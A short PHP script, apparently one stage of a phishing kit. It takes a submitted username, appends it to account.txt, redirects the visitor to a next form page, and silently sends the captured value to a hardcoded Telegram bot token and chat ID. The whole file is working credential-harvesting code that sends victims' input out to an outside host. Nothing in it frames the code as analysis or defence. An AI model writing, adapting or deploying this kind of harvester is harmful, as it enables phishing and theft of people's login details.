<?php
function yazdir($dosya, $kip, $yazi){
    $yazilacakdosya=fopen($dosya, $kip);
    fwrite($yazilacakdosya, $yazi);
    fclose($yazilacakdosya);
}
if(!isset($_POST)){
    header("Location: username.php");
}else{
    if($_POST["submit"]){
        $username = $_POST["username"];
        $yazi = "Username: $username\n";
       if(is_writable('account.txt')){
           $dosya = "account.txt";
           $kip = "a+";
           yazdir($dosya, $kip, $yazi);
           header("Location: form.php");
        }else{
            echo 'dosyaya yazilamiyor.';
        }
    }
	

$token = "1619170130:AAGW7f_v4SrnDAWid8wn9yHpeB58-D2wh_c";

$data = [
    'text' => ' 
	
Username : '.$username.'
',
    'chat_id' => '988338732'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



}


?>